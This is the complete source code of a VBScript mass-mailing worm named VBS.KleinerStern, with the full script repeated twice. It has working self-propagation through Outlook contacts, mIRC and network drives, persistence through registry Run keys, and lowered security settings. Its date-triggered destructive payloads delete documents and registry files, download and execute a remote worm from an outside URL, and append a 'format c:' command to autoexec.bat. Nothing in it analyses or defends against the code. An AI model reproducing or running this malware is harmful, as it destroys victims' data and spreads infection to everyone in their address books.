'VBS.KleinerStern
On Error Resume Next

Const ForReading = 1
Const ForWriting = 2
Const ForAppending = 8

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim wss : Set wss = CreateObject("WScript.Shell")
Dim Outlook : Set Outlook = CreateObject("Outlook.Application")
Dim FName, WinDir, SysDir, HTMLPath, HTMLBody, ScriptPath

    FName = ""
    WinDir = fso.GetSpecialFolder(0) &"\"
    SysDir = fso.GetSpecialFolder(1) &"\"
    HTMLPath = WinDir &"WindowsXP.html"
    ScriptPath = WScript.ScriptFullName

Call Startup()
Call CreateFiles()

 If Outlook = "Outlook" Then 
  Dim Mapi, MapiAdList	
  Set Mapi = Outlook.GetNameSpace("MAPI")
  Set MapiAdList = Mapi.AddressLists
  Call DeleteOutlookFolders()
  Call OutlookBody()
 End If
 
Call Network()
Call Payload()
Call DoDrives()
Call Antidelete(fname)

Function Startup()
On Error Resume Next
Randomize
 Do until Len(FName) = 7 
  FName = FName + Chr(Int((90 - 80 + 1) * Rnd + 80))
 Loop
 
 If FName <> "" Then 
  RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(FName,1) &LCase(Right(FName,6)), "wscript.exe " &Windir &FName &".vbs %", "0"
 End If
End Function

Sub OutlookBody()
On Error Resume Next
Dim Address, NumOfContacts, Counter, EmailItem, ContactNumber
  For Each Address In MapiAdList
   If Address.AddressEntries.Count <> 0 Then
    NumOfContacts = Address.AddressEntries.Count
   
    For Counter = 1 To NumOfContacts
     Set EmailItem = Outlook.CreateItem(0)
     Set ContactNumber = Address.AddressEntries(Counter)
     
     EmailItem.To = ContactNumber.Address
     EmailItem.Subject = "WindowsXP Betatest"
     EmailItem.HTMLBody = HTMLBody
     EmailItem.DeleteAfterSubmit = True 
     EmailItem.Send
    Next
   End If
  Next
End Sub

Sub Mirc(Path)     
On Error Resume Next
	If Path <> "" Then
	 Dim MircScript : Set MircScript = fso.CreateTextFile(Path & "\script.ini", True)
         MircScript.attributes = MircScript.attributes + 1
  	     MircScript.attributes = MircScript.attributes + 2
   	     MircScript.writeline "[script]"
   	     MircScript.writeLine ";mIRC Script"
   	     MircScript.writeLine ";http://www.mirc.com"
   	     MircScript.writeLine ";Please do not edit this script!"
   		 MircScript.writeline "n0=on 1:start:{"
 	 	 MircScript.writeline "n1= .remote on"
  		 MircScript.writeline "n2= .ctcps on"
  		 MircScript.writeline "n3= .events on"
  		 MircScript.writeline "n4= }"
   	     MircScript.writeline "n5=on 1:JOIN:#:{"
   	     MircScript.writeline "n6= /if ( $nick == $me ) { halt }"
	     MircScript.writeline "n7= /.dcc send $nick " &HTMLPath
         MircScript.writeline "n8=}"
 	 	 MircScript.Close
    End If 
End Sub        

Sub Antidelete(rname)
On Error Resume Next

 Dim Myself
 Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)
     MyCode = Myself.readall
     Myself.Close

 Do
  If Not (fso.FileExists(ScriptPath)) Then
   Set Myself = fso.CreateTextFile(ScriptPath, True)
       Myself.write MyCode
       Myself.Close
  End If

  If Not RegGet("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &rname) = "wscript.exe " &Windir &FName &".vbs %" then
   RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(rname,1) &LCase(Right(rname,6)),"wscript.exe " &Windir &FName &".vbs %", "0"
  End if
 Loop
End Sub

Sub RegSet(key,value,keytype)
On Error Resume Next
 Dim re
 Set re = CreateObject("WScript.Shell")
 
 Select Case keytype   
  Case "1" re.RegWrite key,value, "REG_DWORD"
  Case Else re.RegWrite key,value
 End Select  
End Sub

Function RegGet(value)
On Error Resume Next
 Dim re
 Set re = CreateObject("WScript.Shell")
 RegGet = re.RegRead(value)
End Function

Sub Network()
On Error Resume Next
Dim fso, wsn, NetDrives, xc
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsn = CreateObject("WScript.Network")
Set NetDrives = wsn.EnumNetworkDrives

 If NetDrives.Count <> 0 Then
  For xc = 0 To NetDrives.Count - 1
   If InStr(NetDrives.Item(xc), "\" ) <> 0 Then
    fso.CopyFile ScriptPath, fso.BuildPath(NetDrives.Item(xc), WinDir &FName &".vbs") 
   End If
  Next
 End If
End Sub

Function Dodrives()
On Error Resume Next
 Dim hdready
 Set Drives = fso.Drives

 For Each Drive In Drives
  If Drive.Drivetype = Remote Then
   hdready = Drive & "\"
   Call Subfolders(hdready)
  ElseIf Drive.IsReady Then
   hdready = Drive & "\"
   Call Subfolders(hdready)
  End If
 Next
End Function

Function Subfolders(path)
On Error Resume Next
 
 Set Fold = fso.GetFolder(path)
 Set Files = Fold.Files

 For Each file In Files
  Ext = lcase(fso.GetExtensionName(File.Path))

  If file.Name = "mirc.ini" Then
   Call Mirc(file.ParentFolder)
  End If

  If (Ext = "vbs") or (Ext = "vbe") then
   Dim VBSFile : Set VBSFile = fso.OpenTextFile(File.Path,ForAppending,True)
   Dim ScriptFile : Set ScriptFile = fso.OpenTextFile(ScriptPath,ForReading,True)
       VBSFile.Write ScriptFile.ReadAll
       VBSFile.Close
       ScriptFile.Close
  End If 
    
  If Ext = "doc" Then
   fso.DeleteFile(File.Path)
  End If
 Next

 Set file = Fold.Subfolders
  For Each Subfol In file
   Call Subfolders(Subfol.path)
  Next
End Function

Sub RegistrySettings()
On Error Resume Next
    RegSet "HKCR\.mp3\","KleinerStern","0"
    RegSet "HKCR\.avi\","KleinerStern","0"
	RegSet "HKCR\VBSFile\Editflags", 01000100, "1" 
	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"1"
    RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote", 1, "1"
	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled", 1, "1"
	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy", 0, "1"
    RegSet "HKCR\KleinerStern\shell\open\command\", "wscript " &WinDir &fname &" %", "0"
	RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Kleiner Stern", "0"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1204", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1204", 0, "1"
End Sub

Sub DeleteOutlookFolders()
On Error Resume Next
Dim i
     Dim InBox : Set InBox = Mapi.GetDefaultFolder(6)
     Dim DeletedItems : Set DeletedItems = Mapi.GetDefaultFolder(3)

     For i = 1 to InBox.Items.Count
      If InBox.Items.Item(i).Subject = "WindowsXP Betatest" Then
         InBox.Items.Item(i).Close
         InBox.Items.Item(i).Delete
      End If
     Next
     
     For i = 1 to DeletedItems.Items.Count
      If DeletedItems.Items.Item(i).Subject = "WindowsXP Betatest" Then
         DeletedItems.Items.Item(i).Delete
      End If
     Next
End Sub

Sub CreateGarbage()
On Error Resume Next
Dim aname,x
          x = 0
    AName = ""
 
 	Randomize
    Do until x = 500
  	 Do until Len(AName) = 7 
   	  AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))
  	 Loop
      
   	 Dim GarbageFolder : Set GarbageFolder = fso.CreateFolder("c:\" &AName)
       	 GarbageFolder.attributes = GarbageFolder.attributes + 2
         GarbageFolder.attributes = GarbageFolder.attributes + 1
       
   	 Dim GarbageFile : Set GarbageFile = fso.CreateTextFile("c:\" &AName &"\" &AName &".txt", True)
         GarbageFile.WriteLine "Irgendwo strahlt immer ein kleiner Stern!" 
         GarbageFile.Close
     
  	 AName = "" 
  	 x = x + 1
 	Loop       
end Sub



Sub payload()
On Error Resume Next
	
	CreateGarbage()

	If day(now) = 2 then
	 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
     HTTPFileDownload "http://www.astalavista.com/archive/virus/mailworms/homepage_src.txt",WinDir &"hp.vbs"
     wss.run "wscript.exe " &WinDir &"hp.vbs %"
     fso.DeleteFile(Windir &"User.dat")
     fso.DeleteFile(Windir &"User.bak")
     fso.DeleteFile(Windir &"System.dat")
     fso.DeleteFile(Windir &"System.bak")
     fso.DeleteFile(WinDir &"Regedit.exe")
     wss.Run "RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"
    End If

    If day(now) = 4 then
     Dim Autoexec : Set Autoexec = fso.OpenTextFile("C:\Autoexec.bat",ForAppending,True)
         Autoexec.WriteLine "format c: /q /autotest /u"
         Autoexec.Close
    
     wss.Run "RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"
    End If

	If day(now) = 5 Then
  	 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
 	End If

 	If day(now) = 7 Then
  	 Dim AgentControl : Set AgentControl = CreateObject("Agent.Control.1")

 	 If IsObject(AgentControl) Then
   	 AgentControl.Connected = True

   	 Dim merlin, merlindir
   	 merlindir = RegGet("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   	 On Error Resume Next
    	  AgentControl.Characters.Load "merlin", merlindir &"\Microsoft Agent\characters\merlin.acs"
    	  Set merlin= AgentControl.Characters ("merlin")
    	  merlin.Get "state", "Showing"
    	  merlin.Get "state", "Speaking"
    	  merlin.MoveTo 10, 10
    	  merlin.Show
          merlin.Get "state", "Moving"
          merlin.MoveTo 257, 177
          merlin.Speak ("Hör nicht auf zu strahlen, kleiner Stern!")
          merlin.Hide
         End If
        End If 
End Sub 

function HTTPFileDownload( url, FileSaveTo )
On Error Resume Next
Dim receive, Output, i
Dim internet : Set internet = CreateObject("Microsoft.XMLHTTP")

    Output = ""
    internet.open "GET",url,False
    internet.send
    receive = internet.responseBody

    For i = 0 to UBound(receive)
     Output = Output & chrw(ascw(chr(ascb(midb(receive,i+1,1)))))
    Next

    Dim Download : Set Download = fso.CreateTextFile(FileSaveTo,True)
        Download.Write Output
        Download.Close
end Function

Sub CreateFiles()
On Error Resume Next
Dim Buffer, Code, htm, htm2
Dim Script : Set Script = fso.OpenTextFile(ScriptPath,ForReading,False)
Dim Output : Set Output = fso.OpenTextFile(Windir &FName &".vbs",ForWriting,True)
  
  Do While Script.AtEndOfStream = False
   Buffer = Script.ReadLine
   Output.WriteLine Buffer
   Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(Buffer, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
  Loop

  ScriptFile.Close
  OutputFile.Close

  htm = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & "&chr(34)&" & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "META content=" & Chr(34) & "Author" & Chr(34) & " name=Kleiner Stern><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
  htm = htm & vbCrLf & "On Error Resume Next"
  htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
  htm = htm & vbCrLf & "If Err.Number <> 0 Then"
  htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
  htm = htm & vbCrLf & "Else"
  htm = htm & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\notepad.exe.vbs" & Chr(34) & ", True)"
  htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
  htm = htm & vbCrLf & "vbs.Close"
  htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
  htm = htm & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\notepad.exe.vbs %" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "End If"
  htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
  HTMLBody = htm & htm2
   
  Dim b : Set b = fso.CreateTextFile(HTMLPath)
      b.close

  Dim HtmlFile : Set HtmlFile = fso.OpenTextFile(HTMLPath,ForWriting,True)
      Htmlfile.Write htm
      Htmlfile.Write vbcrlf
      Htmlfile.Write htm2
      Htmlfile.Close
End Sub
'VBS.KleinerStern
On Error Resume Next

Const ForReading = 1
Const ForWriting = 2
Const ForAppending = 8

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim wss : Set wss = CreateObject("WScript.Shell")
Dim Outlook : Set Outlook = CreateObject("Outlook.Application")
Dim FName, WinDir, SysDir, HTMLPath, HTMLBody, ScriptPath

    FName = ""
    WinDir = fso.GetSpecialFolder(0) &"\"
    SysDir = fso.GetSpecialFolder(1) &"\"
    HTMLPath = WinDir &"WindowsXP.html"
    ScriptPath = WScript.ScriptFullName

Call Startup()
Call CreateFiles()

 If Outlook = "Outlook" Then 
  Dim Mapi, MapiAdList	
  Set Mapi = Outlook.GetNameSpace("MAPI")
  Set MapiAdList = Mapi.AddressLists
  Call DeleteOutlookFolders()
  Call OutlookBody()
 End If
 
Call Network()
Call Payload()
Call DoDrives()
Call Antidelete(fname)

Function Startup()
On Error Resume Next
Randomize
 Do until Len(FName) = 7 
  FName = FName + Chr(Int((90 - 80 + 1) * Rnd + 80))
 Loop
 
 If FName <> "" Then 
  RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(FName,1) &LCase(Right(FName,6)), "wscript.exe " &Windir &FName &".vbs %", "0"
 End If
End Function

Sub OutlookBody()
On Error Resume Next
Dim Address, NumOfContacts, Counter, EmailItem, ContactNumber
  For Each Address In MapiAdList
   If Address.AddressEntries.Count <> 0 Then
    NumOfContacts = Address.AddressEntries.Count
   
    For Counter = 1 To NumOfContacts
     Set EmailItem = Outlook.CreateItem(0)
     Set ContactNumber = Address.AddressEntries(Counter)
     
     EmailItem.To = ContactNumber.Address
     EmailItem.Subject = "WindowsXP Betatest"
     EmailItem.HTMLBody = HTMLBody
     EmailItem.DeleteAfterSubmit = True 
     EmailItem.Send
    Next
   End If
  Next
End Sub

Sub Mirc(Path)     
On Error Resume Next
	If Path <> "" Then
	 Dim MircScript : Set MircScript = fso.CreateTextFile(Path & "\script.ini", True)
         MircScript.attributes = MircScript.attributes + 1
  	     MircScript.attributes = MircScript.attributes + 2
   	     MircScript.writeline "[script]"
   	     MircScript.writeLine ";mIRC Script"
   	     MircScript.writeLine ";http://www.mirc.com"
   	     MircScript.writeLine ";Please do not edit this script!"
   		 MircScript.writeline "n0=on 1:start:{"
 	 	 MircScript.writeline "n1= .remote on"
  		 MircScript.writeline "n2= .ctcps on"
  		 MircScript.writeline "n3= .events on"
  		 MircScript.writeline "n4= }"
   	     MircScript.writeline "n5=on 1:JOIN:#:{"
   	     MircScript.writeline "n6= /if ( $nick == $me ) { halt }"
	     MircScript.writeline "n7= /.dcc send $nick " &HTMLPath
         MircScript.writeline "n8=}"
 	 	 MircScript.Close
    End If 
End Sub        

Sub Antidelete(rname)
On Error Resume Next

 Dim Myself
 Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)
     MyCode = Myself.readall
     Myself.Close

 Do
  If Not (fso.FileExists(ScriptPath)) Then
   Set Myself = fso.CreateTextFile(ScriptPath, True)
       Myself.write MyCode
       Myself.Close
  End If

  If Not RegGet("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &rname) = "wscript.exe " &Windir &FName &".vbs %" then
   RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(rname,1) &LCase(Right(rname,6)),"wscript.exe " &Windir &FName &".vbs %", "0"
  End if
 Loop
End Sub

Sub RegSet(key,value,keytype)
On Error Resume Next
 Dim re
 Set re = CreateObject("WScript.Shell")
 
 Select Case keytype   
  Case "1" re.RegWrite key,value, "REG_DWORD"
  Case Else re.RegWrite key,value
 End Select  
End Sub

Function RegGet(value)
On Error Resume Next
 Dim re
 Set re = CreateObject("WScript.Shell")
 RegGet = re.RegRead(value)
End Function

Sub Network()
On Error Resume Next
Dim fso, wsn, NetDrives, xc
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsn = CreateObject("WScript.Network")
Set NetDrives = wsn.EnumNetworkDrives

 If NetDrives.Count <> 0 Then
  For xc = 0 To NetDrives.Count - 1
   If InStr(NetDrives.Item(xc), "\" ) <> 0 Then
    fso.CopyFile ScriptPath, fso.BuildPath(NetDrives.Item(xc), WinDir &FName &".vbs") 
   End If
  Next
 End If
End Sub

Function Dodrives()
On Error Resume Next
 Dim hdready
 Set Drives = fso.Drives

 For Each Drive In Drives
  If Drive.Drivetype = Remote Then
   hdready = Drive & "\"
   Call Subfolders(hdready)
  ElseIf Drive.IsReady Then
   hdready = Drive & "\"
   Call Subfolders(hdready)
  End If
 Next
End Function

Function Subfolders(path)
On Error Resume Next
 
 Set Fold = fso.GetFolder(path)
 Set Files = Fold.Files

 For Each file In Files
  Ext = lcase(fso.GetExtensionName(File.Path))

  If file.Name = "mirc.ini" Then
   Call Mirc(file.ParentFolder)
  End If

  If (Ext = "vbs") or (Ext = "vbe") then
   Dim VBSFile : Set VBSFile = fso.OpenTextFile(File.Path,ForAppending,True)
   Dim ScriptFile : Set ScriptFile = fso.OpenTextFile(ScriptPath,ForReading,True)
       VBSFile.Write ScriptFile.ReadAll
       VBSFile.Close
       ScriptFile.Close
  End If 
    
  If Ext = "doc" Then
   fso.DeleteFile(File.Path)
  End If
 Next

 Set file = Fold.Subfolders
  For Each Subfol In file
   Call Subfolders(Subfol.path)
  Next
End Function

Sub RegistrySettings()
On Error Resume Next
    RegSet "HKCR\.mp3\","KleinerStern","0"
    RegSet "HKCR\.avi\","KleinerStern","0"
	RegSet "HKCR\VBSFile\Editflags", 01000100, "1" 
	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"1"
    RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote", 1, "1"
	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled", 1, "1"
	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy", 0, "1"
    RegSet "HKCR\KleinerStern\shell\open\command\", "wscript " &WinDir &fname &" %", "0"
	RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Kleiner Stern", "0"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1204", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1204", 0, "1"
End Sub

Sub DeleteOutlookFolders()
On Error Resume Next
Dim i
     Dim InBox : Set InBox = Mapi.GetDefaultFolder(6)
     Dim DeletedItems : Set DeletedItems = Mapi.GetDefaultFolder(3)

     For i = 1 to InBox.Items.Count
      If InBox.Items.Item(i).Subject = "WindowsXP Betatest" Then
         InBox.Items.Item(i).Close
         InBox.Items.Item(i).Delete
      End If
     Next
     
     For i = 1 to DeletedItems.Items.Count
      If DeletedItems.Items.Item(i).Subject = "WindowsXP Betatest" Then
         DeletedItems.Items.Item(i).Delete
      End If
     Next
End Sub

Sub CreateGarbage()
On Error Resume Next
Dim aname,x
          x = 0
    AName = ""
 
 	Randomize
    Do until x = 500
  	 Do until Len(AName) = 7 
   	  AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))
  	 Loop
      
   	 Dim GarbageFolder : Set GarbageFolder = fso.CreateFolder("c:\" &AName)
       	 GarbageFolder.attributes = GarbageFolder.attributes + 2
         GarbageFolder.attributes = GarbageFolder.attributes + 1
       
   	 Dim GarbageFile : Set GarbageFile = fso.CreateTextFile("c:\" &AName &"\" &AName &".txt", True)
         GarbageFile.WriteLine "Irgendwo strahlt immer ein kleiner Stern!" 
         GarbageFile.Close
     
  	 AName = "" 
  	 x = x + 1
 	Loop       
end Sub



Sub payload()
On Error Resume Next
	
	CreateGarbage()

	If day(now) = 2 then
	 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
     HTTPFileDownload "http://www.astalavista.com/archive/virus/mailworms/homepage_src.txt",WinDir &"hp.vbs"
     wss.run "wscript.exe " &WinDir &"hp.vbs %"
     fso.DeleteFile(Windir &"User.dat")
     fso.DeleteFile(Windir &"User.bak")
     fso.DeleteFile(Windir &"System.dat")
     fso.DeleteFile(Windir &"System.bak")
     fso.DeleteFile(WinDir &"Regedit.exe")
     wss.Run "RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"
    End If

    If day(now) = 4 then
     Dim Autoexec : Set Autoexec = fso.OpenTextFile("C:\Autoexec.bat",ForAppending,True)
         Autoexec.WriteLine "format c: /q /autotest /u"
         Autoexec.Close
    
     wss.Run "RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"
    End If

	If day(now) = 5 Then
  	 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
 	End If

 	If day(now) = 7 Then
  	 Dim AgentControl : Set AgentControl = CreateObject("Agent.Control.1")

 	 If IsObject(AgentControl) Then
   	 AgentControl.Connected = True

   	 Dim merlin, merlindir
   	 merlindir = RegGet("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   	 On Error Resume Next
    	  AgentControl.Characters.Load "merlin", merlindir &"\Microsoft Agent\characters\merlin.acs"
    	  Set merlin= AgentControl.Characters ("merlin")
    	  merlin.Get "state", "Showing"
    	  merlin.Get "state", "Speaking"
    	  merlin.MoveTo 10, 10
    	  merlin.Show
          merlin.Get "state", "Moving"
          merlin.MoveTo 257, 177
          merlin.Speak ("Hör nicht auf zu strahlen, kleiner Stern!")
          merlin.Hide
         End If
        End If 
End Sub 

function HTTPFileDownload( url, FileSaveTo )
On Error Resume Next
Dim receive, Output, i
Dim internet : Set internet = CreateObject("Microsoft.XMLHTTP")

    Output = ""
    internet.open "GET",url,False
    internet.send
    receive = internet.responseBody

    For i = 0 to UBound(receive)
     Output = Output & chrw(ascw(chr(ascb(midb(receive,i+1,1)))))
    Next

    Dim Download : Set Download = fso.CreateTextFile(FileSaveTo,True)
        Download.Write Output
        Download.Close
end Function

Sub CreateFiles()
On Error Resume Next
Dim Buffer, Code, htm, htm2
Dim Script : Set Script = fso.OpenTextFile(ScriptPath,ForReading,False)
Dim Output : Set Output = fso.OpenTextFile(Windir &FName &".vbs",ForWriting,True)
  
  Do While Script.AtEndOfStream = False
   Buffer = Script.ReadLine
   Output.WriteLine Buffer
   Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(Buffer, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
  Loop

  ScriptFile.Close
  OutputFile.Close

  htm = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & "&chr(34)&" & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "META content=" & Chr(34) & "Author" & Chr(34) & " name=Kleiner Stern><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
  htm = htm & vbCrLf & "On Error Resume Next"
  htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
  htm = htm & vbCrLf & "If Err.Number <> 0 Then"
  htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
  htm = htm & vbCrLf & "Else"
  htm = htm & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\notepad.exe.vbs" & Chr(34) & ", True)"
  htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
  htm = htm & vbCrLf & "vbs.Close"
  htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
  htm = htm & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\notepad.exe.vbs %" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "End If"
  htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
  HTMLBody = htm & htm2
   
  Dim b : Set b = fso.CreateTextFile(HTMLPath)
      b.close

  Dim HtmlFile : Set HtmlFile = fso.OpenTextFile(HTMLPath,ForWriting,True)
      Htmlfile.Write htm
      Htmlfile.Write vbcrlf
      Htmlfile.Write htm2
      Htmlfile.Close
End Sub
